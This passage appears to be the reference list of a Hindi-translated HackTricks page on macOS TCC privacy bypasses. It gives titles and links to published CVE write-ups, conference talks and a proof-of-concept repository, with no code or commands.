- [9] [XCSSET malware में Zero-Day TCC bypass की खोज](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "आपके Mac पर जो होता है, क्या वह Apple के iCloud में रहता है?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [नई macOS vulnerability, "powerdir," unauthorized user data access की ओर ले जा सकती है](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory बदलना और TCC bypass करना, अर्थात CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Music चलाना और TCC bypass करना, अर्थात CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [एक (Fire)fox को कैसे लूटें](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS में Telegram के साथ TCC bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Vulnerabilities को उजागर करना: diskarbitrationd और storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks और CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X पर environment variables set करना](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass और privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database पर mount करके TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [अपने macOS Privacy Mechanisms को bypass करने के 20+ तरीके](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC के विरुद्ध Knockout Win - आपके MacOS Privacy Mechanisms को bypass करने के 20+ नए तरीके](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
